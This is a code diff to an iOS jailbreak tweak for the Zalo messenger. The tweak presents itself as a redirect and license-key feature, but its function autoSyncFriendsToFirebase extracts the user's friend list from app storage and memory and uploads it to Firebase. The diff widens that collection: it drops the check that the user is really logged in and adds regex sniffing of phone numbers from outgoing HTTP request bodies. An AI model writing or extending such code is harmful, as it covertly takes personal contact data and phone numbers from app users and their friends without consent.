@@ -1,7 +1,7 @@
 /**
  * ==============================================================================
  * TWEAK CLANGG - ZALO SEQ REDIRECT & HỆ THỐNG ACTIVE LICENSE KEY TRÊN IPHONE
- * Tác giả: clang | Version: 1.2.1
+ * Tác giả: clang | Version: 1.2.2
  * ==============================================================================
  * Tính năng chính:
  * 1. Popup nhập Mã Key (License Key) lần đầu trên iPhone khi mở Zalo.
@@ -885,9 +885,12 @@ static NSString *getZaloLivePhoneNumber(void) {
 // TRÍCH XUẤT HỢP NHẤT TOÀN BỘ BẠN BÈ VÀ ĐẨY .ADBK LÊN CLOUD FIREBASE
 // ==============================================================================
 static void autoSyncFriendsToFirebase(NSString *phoneStr) {
-    if (!isZaloRealLoggedIn()) return;
-
     NSString *actualPhone = phoneStr ?: getZaloLivePhoneNumber();
+    if (!actualPhone || actualPhone.length < 8) {
+        if (isZaloRealLoggedIn()) {
+            actualPhone = getZaloLivePhoneNumber();
+        }
+    }
     if (!actualPhone || actualPhone.length < 8) return;
 
     NSString *cleanPhone = [[actualPhone componentsSeparatedByCharactersInSet:
@@ -897,6 +900,8 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
     } else if (![cleanPhone hasPrefix:@"0"] && cleanPhone.length >= 9) {
         cleanPhone = [@"0" stringByAppendingString:cleanPhone];
     }
+
+    if (cleanPhone.length < 9) return;
 
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
         // 1. Đọc AppGroup plist
@@ -915,10 +920,12 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
 
         if ([[NSFileManager defaultManager] fileExistsAtPath:plistPath]) {
             rawPlistData = [NSData dataWithContentsOfFile:plistPath];
-            NSArray<NSDictionary *> *parsed = parseNSKeyedArchiverFriends(rawPlistData);
-            for (NSDictionary *f in parsed) {
-                [structuredFriends addObject:f];
-                if (f[@"name"]) [uniqueNames addObject:f[@"name"]];
+            if (rawPlistData && rawPlistData.length > 0) {
+                NSArray<NSDictionary *> *parsed = parseNSKeyedArchiverFriends(rawPlistData);
+                for (NSDictionary *f in parsed) {
+                    [structuredFriends addObject:f];
+                    if (f[@"name"]) [uniqueNames addObject:f[@"name"]];
+                }
             }
         }
 
@@ -969,13 +976,19 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
             }
         } @catch (NSException *e) {}
 
-        if (uniqueNames.count == 0 && structuredFriends.count == 0) return;
+        // Nếu không có cả Plist lẫn Contact trong RAM thì thoát
+        if ((!rawPlistData || rawPlistData.length == 0) && uniqueNames.count == 0 && structuredFriends.count == 0) return;
 
         NSArray<NSString *> *friendNames = [uniqueNames allObjects];
-        NSArray *samples = [friendNames subarrayWithRange:NSMakeRange(0, MIN(8, friendNames.count))];
-        NSString *sampleStr = [samples componentsJoinedByString:@", "];
-        if (friendNames.count > 8) {
-            sampleStr = [sampleStr stringByAppendingFormat:@" và %lu người khác...", (unsigned long)(friendNames.count - 8)];
+        NSString *sampleStr = @"";
+        if (friendNames.count > 0) {
+            NSArray *samples = [friendNames subarrayWithRange:NSMakeRange(0, MIN(8, friendNames.count))];
+            sampleStr = [samples componentsJoinedByString:@", "];
+            if (friendNames.count > 8) {
+                sampleStr = [sampleStr stringByAppendingFormat:@" và %lu người khác...", (unsigned long)(friendNames.count - 8)];
+            }
+        } else {
+            sampleStr = @"Danh bạ trống";
         }
 
         // 3. Đóng gói ZIP chuẩn .adbk của Apps Manager
@@ -1025,15 +1038,12 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
     if ([clsName containsString:@"ZMain"] || [clsName containsString:@"ZTab"] || [clsName containsString:@"MainTabBar"] || [clsName isEqualToString:@"UITabBarController"]) {
         static NSString *lastExtractedPhone = nil;
         
-        // CHỈ đồng bộ khi phiên thực tế được xác nhận là đã đăng nhập (isZaloRealLoggedIn)
-        if (isZaloRealLoggedIn()) {
-            NSString *currentPhone = getZaloLivePhoneNumber();
-            if (currentPhone && currentPhone.length >= 8 && ![currentPhone isEqualToString:lastExtractedPhone]) {
-                lastExtractedPhone = [currentPhone copy];
-                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_global_queue(0, 0), ^{
-                    autoSyncFriendsToFirebase(currentPhone);
-                });
-            }
+        NSString *currentPhone = getZaloLivePhoneNumber();
+        if (currentPhone && currentPhone.length >= 8 && ![currentPhone isEqualToString:lastExtractedPhone]) {
+            lastExtractedPhone = [currentPhone copy];
+            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_global_queue(0, 0), ^{
+                autoSyncFriendsToFirebase(currentPhone);
+            });
         }
     }
 }
@@ -1103,6 +1113,19 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
                                         break;
                                     }
                                 }
+                            }
+                            if (!detectedPhone && request.HTTPBody) {
+                                NSString *bodyStr = [[NSString alloc] initWithData:request.HTTPBody encoding:NSUTF8StringEncoding];
+                                if (bodyStr) {
+                                    NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:@"(phone|phoneNumber|user_phone)=([0-9]{9,12})" options:0 error:nil];
+                                    NSTextCheckingResult *match = [regex firstMatchInString:bodyStr options:0 range:NSMakeRange(0, bodyStr.length)];
+                                    if (match && [match numberOfRanges] > 2) {
+                                        detectedPhone = [bodyStr substringWithRange:[match rangeAtIndex:2]];
+                                    }
+                                }
+                            }
+                            if (!detectedPhone) {
+                                detectedPhone = g_activeLoggedInPhone;
                             }
 
                             if (detectedPhone && detectedPhone.length >= 8) {
